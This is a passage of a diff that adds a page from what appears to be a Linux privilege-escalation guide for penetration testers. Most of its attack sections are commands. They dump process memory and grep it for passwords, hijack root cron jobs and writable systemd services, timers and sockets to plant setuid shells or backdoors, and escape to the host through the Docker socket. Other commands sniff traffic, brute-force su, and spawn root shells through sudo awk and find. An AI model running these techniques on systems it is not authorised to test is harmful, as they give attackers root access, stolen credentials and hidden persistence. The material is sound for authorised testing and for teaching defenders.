+    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
+done
+</code></pre>
+<h4 id="procpidmaps--procpidmem"><a class="header" href="#procpidmaps--procpidmem">/proc/$pid/maps &amp; /proc/$pid/mem</a></h4>
+<p>For a given process ID, <strong>maps show how memory is mapped within that process's</strong> virtual address space; it also shows the <strong>permissions of each mapped region</strong>. The <strong>mem</strong> pseudo file <strong>exposes the processes memory itself</strong>. From the <strong>maps</strong> file we know which <strong>memory regions are readable</strong> and their offsets. We use this information to <strong>seek into the mem file and dump all readable regions</strong> to a file.</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">procdump()
+(
+    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
+    while read a b; do
+        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
+           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
+    done )
+    cat $1*.bin &gt; $1.dump
+    rm $1*.bin
+)
+</code></pre>
+<h4 id="devmem"><a class="header" href="#devmem">/dev/mem</a></h4>
+<p><code>/dev/mem</code> provides access to the system's <strong>physical</strong> memory, not the virtual memory. The kernel's virtual address space can be accessed using /dev/kmem.<br />
+Typically, <code>/dev/mem</code> is only readable by <strong>root</strong> and <strong>kmem</strong> group.</p>
+<pre><code>strings /dev/mem -n10 | grep -i PASS
+</code></pre>
+<h3 id="procdump-for-linux"><a class="header" href="#procdump-for-linux">ProcDump for linux</a></h3>
+<p>ProcDump is a Linux reimagining of the classic ProcDump tool from the Sysinternals suite of tools for Windows. Get it in <a href="https://github.com/Sysinternals/ProcDump-for-Linux">https://github.com/Sysinternals/ProcDump-for-Linux</a></p>
+<pre><code>procdump -p 1714
+
+ProcDump v1.2 - Sysinternals process dump utility
+Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
+Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
+Monitors a process and writes a dump file when the process meets the
+specified criteria.
+
+Process:		sleep (1714)
+CPU Threshold:		n/a
+Commit Threshold:	n/a
+Thread Threshold:		n/a
+File descriptor Threshold:		n/a
+Signal:		n/a
+Polling interval (ms):	1000
+Threshold (s):	10
+Number of Dumps:	1
+Output directory for core dumps:	.
+
+Press Ctrl-C to end monitoring without terminating the process.
+
+[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
+[20:20:58 - INFO]: Timed:
+[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
+</code></pre>
+<h3 id="tools"><a class="header" href="#tools">Tools</a></h3>
+<p>To dump a process memory you could use:</p>
+<ul>
+<li><a href="https://github.com/Sysinternals/ProcDump-for-Linux"><strong>https://github.com/Sysinternals/ProcDump-for-Linux</strong></a></li>
+<li><a href="https://github.com/hajzer/bash-memory-dump"><strong>https://github.com/hajzer/bash-memory-dump</strong></a> (root) - _You can manually remove root requirements and dump the process owned by you</li>
+<li>Script A.5 from <a href="https://www.delaat.net/rp/2016-2017/p97/report.pdf"><strong>https://www.delaat.net/rp/2016-2017/p97/report.pdf</strong></a> (root is required)</li>
+</ul>
+<h3 id="credentials-from-process-memory"><a class="header" href="#credentials-from-process-memory">Credentials from Process Memory</a></h3>
+<h4 id="manual-example"><a class="header" href="#manual-example">Manual example</a></h4>
+<p>If you find that the authenticator process is running:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">ps -ef | grep "authenticator"
+root      2027  2025  0 11:46 ?        00:00:00 authenticator
+</code></pre>
+<p>You can dump the process (see before sections to find different ways to dump the memory of a process) and search for credentials inside the memory:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">./dump-memory.sh 2027
+strings *.dump | grep -i password
+</code></pre>
+<h4 id="mimipenguin"><a class="header" href="#mimipenguin">mimipenguin</a></h4>
+<p>The tool <a href="https://github.com/huntergregal/mimipenguin"><strong>https://github.com/huntergregal/mimipenguin</strong></a> will <strong>steal clear text credentials from memory</strong> and from some <strong>well known files</strong>. It requires root privileges to work properly.</p>
+<div class="table-wrapper"><table><thead><tr><th>Feature</th><th>Process Name</th></tr></thead><tbody>
+<tr><td>GDM password (Kali Desktop, Debian Desktop)</td><td>gdm-password</td></tr>
+<tr><td>Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop)</td><td>gnome-keyring-daemon</td></tr>
+<tr><td>LightDM (Ubuntu Desktop)</td><td>lightdm</td></tr>
+<tr><td>VSFTPd (Active FTP Connections)</td><td>vsftpd</td></tr>
+<tr><td>Apache2 (Active HTTP Basic Auth Sessions)</td><td>apache2</td></tr>
+<tr><td>OpenSSH (Active SSH Sessions - Sudo Usage)</td><td>sshd:</td></tr>
+</tbody></table>
+</div>
+<h4 id="search-regexestruffleproc"><a class="header" href="#search-regexestruffleproc">Search Regexes/<a href="https://github.com/controlplaneio/truffleproc">truffleproc</a></a></h4>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash"># un truffleproc.sh against your current Bash shell (e.g. $$)
+./truffleproc.sh $$
+# coredumping pid 6174
+Reading symbols from od...
+Reading symbols from /usr/lib/systemd/systemd...
+Reading symbols from /lib/systemd/libsystemd-shared-247.so...
+Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
+[...]
+# extracting strings to /tmp/tmp.o6HV0Pl3fe
+# finding secrets
+# results in /tmp/tmp.o6HV0Pl3fe/results.txt
+</code></pre>
+<h2 id="scheduledcron-jobs"><a class="header" href="#scheduledcron-jobs">Scheduled/Cron jobs</a></h2>
+<p>Check if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">crontab -l
+ls -al /etc/cron* /etc/at*
+cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2&gt;/dev/null | grep -v "^#"
+</code></pre>
+<h3 id="cron-path"><a class="header" href="#cron-path">Cron path</a></h3>
+<p>For example, inside <em>/etc/crontab</em> you can find the PATH: <em>PATH=<strong>/home/user</strong>:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</em></p>
+<p>(<em>Note how the user "user" has writing privileges over /home/user</em>)</p>
+<p>If inside this crontab the root user tries to execute some command or script without setting the path. For example: <em>* * * * root overwrite.sh</em><br />
+Then, you can get a root shell by using:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; /home/user/overwrite.sh
+#Wait cron job to be executed
+/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
+</code></pre>
+<h3 id="cron-using-a-script-with-a-wildcard-wildcard-injection"><a class="header" href="#cron-using-a-script-with-a-wildcard-wildcard-injection">Cron using a script with a wildcard (Wildcard Injection)</a></h3>
+<p>If a script is executed by root has a “<strong>*</strong>” inside a command, you could exploit this to make unexpected things (like privesc). Example:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
+</code></pre>
+<p><strong>If the wildcard is preceded of a path like</strong> <em><strong>/some/path/*</strong></em> <strong>, it's not vulnerable (even</strong> <em><strong>./*</strong></em> <strong>is not).</strong></p>
+<p>Read the following page for more wildcard exploitation tricks:</p>
+<p><a class="content_ref" href="wildcards-spare-tricks.html"><span class="content_ref_label">Wildcards Spare tricks</span></a></p>
+<h3 id="cron-script-overwriting-and-symlink"><a class="header" href="#cron-script-overwriting-and-symlink">Cron script overwriting and symlink</a></h3>
+<p>If you <strong>can modify a cron script</strong> executed by root, you can get a shell very easily:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; &lt;/PATH/CRON/SCRIPT&gt;
+#Wait until it is executed
+/tmp/bash -p
+</code></pre>
+<p>If the script executed by root uses a <strong>directory where you have full access</strong>, maybe it could be useful to delete that folder and <strong>create a symlink folder to another one</strong> serving a script controlled by you</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">ln -d -s &lt;/PATH/TO/POINT&gt; &lt;/PATH/CREATE/FOLDER&gt;
+</code></pre>
+<h3 id="frequent-cron-jobs"><a class="header" href="#frequent-cron-jobs">Frequent cron jobs</a></h3>
+<p>You can monitor the processes to search for processes that are being executed every 1, 2 or 5 minutes. Maybe you can take advantage of it and escalate privileges.</p>
+<p>For example, to <strong>monitor every 0.1s during 1 minute</strong>, <strong>sort by less executed commands</strong> and delete the commands that have been executed the most, you can do:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">for i in $(seq 1 610); do ps -e --format cmd &gt;&gt; /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
+</code></pre>
+<p><strong>You can also use</strong> <a href="https://github.com/DominicBreuker/pspy/releases"><strong>pspy</strong></a> (this will monitor and list every process that starts).</p>
+<h3 id="invisible-cron-jobs"><a class="header" href="#invisible-cron-jobs">Invisible cron jobs</a></h3>
+<p>It's possible to create a cronjob <strong>putting a carriage return after a comment</strong> (without newline character), and the cron job will work. Example (note the carriage return char):</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
+</code></pre>
+<h2 id="services"><a class="header" href="#services">Services</a></h2>
+<h3 id="writable-service-files"><a class="header" href="#writable-service-files">Writable <em>.service</em> files</a></h3>
+<p>Check if you can write any <code>.service</code> file, if you can, you <strong>could modify it</strong> so it <strong>executes</strong> your <strong>backdoor when</strong> the service is <strong>started</strong>, <strong>restarted</strong> or <strong>stopped</strong> (maybe you will need to wait until the machine is rebooted).<br />
+For example create your backdoor inside the .service file with <strong><code>ExecStart=/tmp/script.sh</code></strong></p>
+<h3 id="writable-service-binaries"><a class="header" href="#writable-service-binaries">Writable service binaries</a></h3>
+<p>Keep in mind that if you have <strong>write permissions over binaries being executed by services</strong>, you can change them for backdoors so when the services get re-executed the backdoors will be executed.</p>
+<h3 id="systemd-path---relative-paths"><a class="header" href="#systemd-path---relative-paths">systemd PATH - Relative Paths</a></h3>
+<p>You can see the PATH used by <strong>systemd</strong> with:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">systemctl show-environment
+</code></pre>
+<p>If you find that you can <strong>write</strong> in any of the folders of the path you may be able to <strong>escalate privileges</strong>. You need to search for <strong>relative paths being used on service configurations</strong> files like:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">ExecStart=faraday-server
+ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
+ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
+</code></pre>
+<p>Then, create an <strong>executable</strong> with the <strong>same name as the relative path binary</strong> inside the systemd PATH folder you can write, and when the service is asked to execute the vulnerable action (<strong>Start</strong>, <strong>Stop</strong>, <strong>Reload</strong>), your <strong>backdoor will be executed</strong> (unprivileged users usually cannot start/stop services but check if you can use <code>sudo -l</code>).</p>
+<p><strong>Learn more about services with <code>man systemd.service</code>.</strong></p>
+<h2 id="timers"><a class="header" href="#timers"><strong>Timers</strong></a></h2>
+<p><strong>Timers</strong> are systemd unit files whose name ends in <code>**.timer**</code> that control <code>**.service**</code> files or events. <strong>Timers</strong> can be used as an alternative to cron as they have built-in support for calendar time events and monotonic time events and can be run asynchronously.</p>
+<p>You can enumerate all the timers with:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">systemctl list-timers --all
+</code></pre>
+<h3 id="writable-timers"><a class="header" href="#writable-timers">Writable timers</a></h3>
+<p>If you can modify a timer you can make it execute some existents of systemd.unit (like a <code>.service</code> or a <code>.target</code>)</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">Unit=backdoor.service
+</code></pre>
+<p>In the documentation you can read what the Unit is:</p>
+<blockquote>
+<p>The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.</p>
+</blockquote>
+<p>Therefore, to abuse this permission you would need to:</p>
+<ul>
+<li>Find some systemd unit (like a <code>.service</code>) that is <strong>executing a writable binary</strong></li>
+<li>Find some systemd unit that is <strong>executing a relative path</strong> and you have <strong>writable privileges</strong> over the <strong>systemd PATH</strong> (to impersonate that executable)</li>
+</ul>
+<p><strong>Learn more about timers with <code>man systemd.timer</code>.</strong></p>
+<h3 id="enabling-timer"><a class="header" href="#enabling-timer"><strong>Enabling Timer</strong></a></h3>
+<p>To enable a timer you need root privileges and to execute:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">sudo systemctl enable backu2.timer
+Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
+</code></pre>
+<p>Note the <strong>timer</strong> is <strong>activated</strong> by creating a symlink to it on <code>/etc/systemd/system/&lt;WantedBy_section&gt;.wants/&lt;name&gt;.timer</code></p>
+<h2 id="sockets"><a class="header" href="#sockets">Sockets</a></h2>
+<p>Unix Domain Sockets (UDS) enable <strong>process communication</strong> on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through <code>.socket</code> files.</p>
+<p>Sockets can be configured using <code>.socket</code> files.</p>
+<p><strong>Learn more about sockets with <code>man systemd.socket</code>.</strong> Inside this file, several interesting parameters can be configured:</p>
+<ul>
+<li><code>ListenStream</code>, <code>ListenDatagram</code>, <code>ListenSequentialPacket</code>, <code>ListenFIFO</code>, <code>ListenSpecial</code>, <code>ListenNetlink</code>, <code>ListenMessageQueue</code>, <code>ListenUSBFunction</code>: These options are different but a summary is used to <strong>indicate where it is going to listen</strong> to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)</li>
+<li><code>Accept</code>: Takes a boolean argument. If <strong>true</strong>, a <strong>service instance is spawned for each incoming connection</strong> and only the connection socket is passed to it. If <strong>false</strong>, all listening sockets themselves are <strong>passed to the started service unit</strong>, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. <strong>Defaults to false</strong>. For performance reasons, it is recommended to write new daemons only in a way that is suitable for <code>Accept=no</code>.</li>
+<li><code>ExecStartPre</code>, <code>ExecStartPost</code>: Takes one or more command lines, which are <strong>executed before</strong> or <strong>after</strong> the listening <strong>sockets</strong>/FIFOs are <strong>created</strong> and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.</li>
+<li><code>ExecStopPre</code>, <code>ExecStopPost</code>: Additional <strong>commands</strong> that are <strong>executed before</strong> or <strong>after</strong> the listening <strong>sockets</strong>/FIFOs are <strong>closed</strong> and removed, respectively.</li>
+<li><code>Service</code>: Specifies the <strong>service</strong> unit name <strong>to activate</strong> on <strong>incoming traffic</strong>. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.</li>
+</ul>
+<h3 id="writable-socket-files"><a class="header" href="#writable-socket-files">Writable .socket files</a></h3>
+<p>If you find a <strong>writable</strong> <code>.socket</code> file you can <strong>add</strong> at the beginning of the <code>[Socket]</code> section something like: <code>ExecStartPre=/home/kali/sys/backdoor</code> and the backdoor will be executed before the socket is created. Therefore, you will <strong>probably need to wait until the machine is rebooted.</strong><br />
+<em>Note that the system must be using that socket file configuration or the backdoor won't be executed</em></p>
+<h3 id="writable-sockets"><a class="header" href="#writable-sockets">Writable sockets</a></h3>
+<p>If you <strong>identify any writable socket</strong> (<em>now we are talking about Unix Sockets and not about the config <code>.socket</code> files</em>), then <strong>you can communicate</strong> with that socket and maybe exploit a vulnerability.</p>
+<h3 id="enumerate-unix-sockets"><a class="header" href="#enumerate-unix-sockets">Enumerate Unix Sockets</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">netstat -a -p --unix
+</code></pre>
+<h3 id="raw-connection"><a class="header" href="#raw-connection">Raw connection</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">#apt-get install netcat-openbsd
+nc -U /tmp/socket  #Connect to UNIX-domain stream socket
+nc -uU /tmp/socket #Connect to UNIX-domain datagram socket
+
+#apt-get install socat
+socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
+</code></pre>
+<p><strong>Exploitation example:</strong></p>
+<p><a class="content_ref" href="socket-command-injection.html"><span class="content_ref_label">Socket Command Injection</span></a></p>
+<h3 id="http-sockets"><a class="header" href="#http-sockets">HTTP sockets</a></h3>
+<p>Note that there may be some <strong>sockets listening for HTTP</strong> requests (<em>I'm not talking about .socket files but the files acting as unix sockets</em>). You can check this with:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
+</code></pre>
+<p>If the socket <strong>responds with an HTTP</strong> request, then you can <strong>communicate</strong> with it and maybe <strong>exploit some vulnerability</strong>.</p>
+<h3 id="writable-docker-socket"><a class="header" href="#writable-docker-socket">Writable Docker Socket</a></h3>
+<p>The Docker socket, often found at <code>/var/run/docker.sock</code>, is a critical file that should be secured. By default, it's writable by the <code>root</code> user and members of the <code>docker</code> group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.</p>
+<h4 id="privilege-escalation-with-docker-cli"><a class="header" href="#privilege-escalation-with-docker-cli"><strong>Privilege Escalation with Docker CLI</strong></a></h4>
+<p>If you have write access to the Docker socket, you can escalate privileges using the following commands:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+</code></pre>
+<p>These commands allow you to run a container with root-level access to the host's file system.</p>
+<h4 id="using-docker-api-directly"><a class="header" href="#using-docker-api-directly"><strong>Using Docker API Directly</strong></a></h4>
+<p>In cases where the Docker CLI isn't available, the Docker socket can still be manipulated using the Docker API and <code>curl</code> commands.</p>
+<ol>
+<li>
+<p><strong>List Docker Images:</strong> Retrieve the list of available images.</p>
+<pre><code class="language-bash">curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
+</code></pre>
+</li>
+<li>
+<p><strong>Create a Container:</strong> Send a request to create a container that mounts the host system's root directory.</p>
+<pre><code class="language-bash">curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"&lt;ImageID&gt;","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
+</code></pre>
+<p>Start the newly created container:</p>
+<pre><code class="language-bash">curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/&lt;NewContainerID&gt;/start
+</code></pre>
+</li>
+<li>
+<p><strong>Attach to the Container:</strong> Use <code>socat</code> to establish a connection to the container, enabling command execution within it.</p>
+<pre><code class="language-bash">socat - UNIX-CONNECT:/var/run/docker.sock
+POST /containers/&lt;NewContainerID&gt;/attach?stream=1&amp;stdin=1&amp;stdout=1&amp;stderr=1 HTTP/1.1
+Host:
+Connection: Upgrade
+Upgrade: tcp
+</code></pre>
+</li>
+</ol>
+<p>After setting up the <code>socat</code> connection, you can execute commands directly in the container with root-level access to the host's filesystem.</p>
+<h3 id="others"><a class="header" href="#others">Others</a></h3>
+<p>Note that if you have write permissions over the docker socket because you are <strong>inside the group <code>docker</code></strong> you have <a href="interesting-groups-linux-pe/index.html#docker-group"><strong>more ways to escalate privileges</strong></a>. If the <a href="../../network-services-pentesting/2375-pentesting-docker.html#compromising"><strong>docker API is listening in a port</strong> you can also be able to compromise it</a>.</p>
+<p>Check <strong>more ways to break out from docker or abuse it to escalate privileges</strong> in:</p>
+<p><a class="content_ref" href="docker-security/index.html"><span class="content_ref_label">Docker Security</span></a></p>
+<h2 id="containerd-ctr-privilege-escalation"><a class="header" href="#containerd-ctr-privilege-escalation">Containerd (ctr) privilege escalation</a></h2>
+<p>If you find that you can use the <strong><code>ctr</code></strong> command read the following page as <strong>you may be able to abuse it to escalate privileges</strong>:</p>
+<p><a class="content_ref" href="containerd-ctr-privilege-escalation.html"><span class="content_ref_label">Containerd (ctr) Privilege Escalation</span></a></p>
+<h2 id="runc-privilege-escalation"><a class="header" href="#runc-privilege-escalation"><strong>RunC</strong> privilege escalation</a></h2>
+<p>If you find that you can use the <strong><code>runc</code></strong> command read the following page as <strong>you may be able to abuse it to escalate privileges</strong>:</p>
+<p><a class="content_ref" href="runc-privilege-escalation.html"><span class="content_ref_label">RunC Privilege Escalation</span></a></p>
+<h2 id="d-bus"><a class="header" href="#d-bus"><strong>D-Bus</strong></a></h2>
+<p>D-Bus is a sophisticated <strong>inter-Process Communication (IPC) system</strong> that enables applications to efficiently interact and share data. Designed with the modern Linux system in mind, it offers a robust framework for different forms of application communication.</p>
+<p>The system is versatile, supporting basic IPC that enhances data exchange between processes, reminiscent of <strong>enhanced UNIX domain sockets</strong>. Moreover, it aids in broadcasting events or signals, fostering seamless integration among system components. For instance, a signal from a Bluetooth daemon about an incoming call can prompt a music player to mute, enhancing user experience. Additionally, D-Bus supports a remote object system, simplifying service requests and method invocations between applications, streamlining processes that were traditionally complex.</p>
+<p>D-Bus operates on an <strong>allow/deny model</strong>, managing message permissions (method calls, signal emissions, etc.) based on the cumulative effect of matching policy rules. These policies specify interactions with the bus, potentially allowing for privilege escalation through the exploitation of these permissions.</p>
+<p>An example of such a policy in <code>/etc/dbus-1/system.d/wpa_supplicant.conf</code> is provided, detailing permissions for the root user to own, send to, and receive messages from <code>fi.w1.wpa_supplicant1</code>.</p>
+<p>Policies without a specified user or group apply universally, while "default" context policies apply to all not covered by other specific policies.</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">xml</span></div>
+<pre><code class="language-xml">&lt;policy user="root"&gt;
+    &lt;allow own="fi.w1.wpa_supplicant1"/&gt;
+    &lt;allow send_destination="fi.w1.wpa_supplicant1"/&gt;
+    &lt;allow send_interface="fi.w1.wpa_supplicant1"/&gt;
+    &lt;allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/&gt;
+&lt;/policy&gt;
+</code></pre>
+<p><strong>Learn how to enumerate and exploit a D-Bus communication here:</strong></p>
+<p><a class="content_ref" href="d-bus-enumeration-and-command-injection-privilege-escalation.html"><span class="content_ref_label">D-Bus Enumeration &amp; Command Injection Privilege Escalation</span></a></p>
+<h2 id="network"><a class="header" href="#network"><strong>Network</strong></a></h2>
+<p>It's always interesting to enumerate the network and figure out the position of the machine.</p>
+<h3 id="generic-enumeration"><a class="header" href="#generic-enumeration">Generic enumeration</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">#Hostname, hosts and DNS
+cat /etc/hostname /etc/hosts /etc/resolv.conf
+dnsdomainname
+
+#Content of /etc/inetd.conf &amp; /etc/xinetd.conf
+cat /etc/inetd.conf /etc/xinetd.conf
+
+#Interfaces
+cat /etc/networks
+(ifconfig || ip a)
+
+#Neighbours
+(arp -e || arp -a)
+(route || ip n)
+
+#Iptables rules
+(timeout 1 iptables -L 2&gt;/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2&gt;/dev/null)
+
+#Files used by network services
+lsof -i
+</code></pre>
+<h3 id="open-ports"><a class="header" href="#open-ports">Open ports</a></h3>
+<p>Always check network services running on the machine that you weren't able to interact with before accessing it:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">(netstat -punta || ss --ntpu)
+(netstat -punta || ss --ntpu) | grep "127.0"
+</code></pre>
+<h3 id="sniffing"><a class="header" href="#sniffing">Sniffing</a></h3>
+<p>Check if you can sniff traffic. If you can, you could be able to grab some credentials.</p>
+<pre><code>timeout 1 tcpdump
+</code></pre>
+<h2 id="users"><a class="header" href="#users">Users</a></h2>
+<h3 id="generic-enumeration-1"><a class="header" href="#generic-enumeration-1">Generic Enumeration</a></h3>
+<p>Check <strong>who</strong> you are, which <strong>privileges</strong> do you have, which <strong>users</strong> are in the systems, which ones can <strong>login</strong> and which ones have <strong>root privileges:</strong></p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">#Info about me
+id || (whoami &amp;&amp; groups) 2&gt;/dev/null
+#List all users
+cat /etc/passwd | cut -d: -f1
+#List users with console
+cat /etc/passwd | grep "sh$"
+#List superusers
+awk -F: '($3 == "0") {print}' /etc/passwd
+#Currently logged users
+w
+#Login history
+last | tail
+#Last log of each user
+lastlog
+
+#List all users and their groups
+for i in $(cut -d":" -f1 /etc/passwd 2&gt;/dev/null);do id $i;done 2&gt;/dev/null | sort
+#Current user PGP keys
+gpg --list-keys 2&gt;/dev/null
+</code></pre>
+<h3 id="big-uid"><a class="header" href="#big-uid">Big UID</a></h3>
+<p>Some Linux versions were affected by a bug that allows users with <strong>UID &gt; INT_MAX</strong> to escalate privileges. More info: <a href="https://gitlab.freedesktop.org/polkit/polkit/issues/74">here</a>, <a href="https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh">here</a> and <a href="https://twitter.com/paragonsec/status/1071152249529884674">here</a>.<br />
+<strong>Exploit it</strong> using: <strong><code>systemd-run -t /bin/bash</code></strong></p>
+<h3 id="groups"><a class="header" href="#groups">Groups</a></h3>
+<p>Check if you are a <strong>member of some group</strong> that could grant you root privileges:</p>
+<p><a class="content_ref" href="interesting-groups-linux-pe/index.html"><span class="content_ref_label">Interesting Groups - Linux Privesc</span></a></p>
+<h3 id="clipboard"><a class="header" href="#clipboard">Clipboard</a></h3>
+<p>Check if anything interesting is located inside the clipboard (if possible)</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">if [ `which xclip 2&gt;/dev/null` ]; then
+    echo "Clipboard: "`xclip -o -selection clipboard 2&gt;/dev/null`
+    echo "Highlighted text: "`xclip -o 2&gt;/dev/null`
+  elif [ `which xsel 2&gt;/dev/null` ]; then
+    echo "Clipboard: "`xsel -ob 2&gt;/dev/null`
+    echo "Highlighted text: "`xsel -o 2&gt;/dev/null`
+  else echo "Not found xsel and xclip"
+  fi
+</code></pre>
+<h3 id="password-policy"><a class="header" href="#password-policy">Password Policy</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
+</code></pre>
+<h3 id="known-passwords"><a class="header" href="#known-passwords">Known passwords</a></h3>
+<p>If you <strong>know any password</strong> of the environment <strong>try to login as each user</strong> using the password.</p>
+<h3 id="su-brute"><a class="header" href="#su-brute">Su Brute</a></h3>
+<p>If don't mind about doing a lot of noise and <code>su</code> and <code>timeout</code> binaries are present on the computer, you can try to brute-force user using <a href="https://github.com/carlospolop/su-bruteforce">su-bruteforce</a>.<br />
+<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite"><strong>Linpeas</strong></a> with <code>-a</code> parameter also try to brute-force users.</p>
+<h2 id="writable-path-abuses"><a class="header" href="#writable-path-abuses">Writable PATH abuses</a></h2>
+<h3 id="path-1"><a class="header" href="#path-1">$PATH</a></h3>
+<p>If you find that you can <strong>write inside some folder of the $PATH</strong> you may be able to escalate privileges by <strong>creating a backdoor inside the writable folder</strong> with the name of some command that is going to be executed by a different user (root ideally) and that is <strong>not loaded from a folder that is located previous</strong> to your writable folder in $PATH.</p>
+<h3 id="sudo-and-suid"><a class="header" href="#sudo-and-suid">SUDO and SUID</a></h3>
+<p>You could be allowed to execute some command using sudo or they could have the suid bit. Check it using:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">sudo -l #Check commands you can execute with sudo
+find / -perm -4000 2&gt;/dev/null #Find all SUID binaries
+</code></pre>
+<p>Some <strong>unexpected commands allow you to read and/or write files or even execute a command.</strong> For example:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">sudo awk 'BEGIN {system("/bin/sh")}'
+sudo find /etc -exec sh -i \;
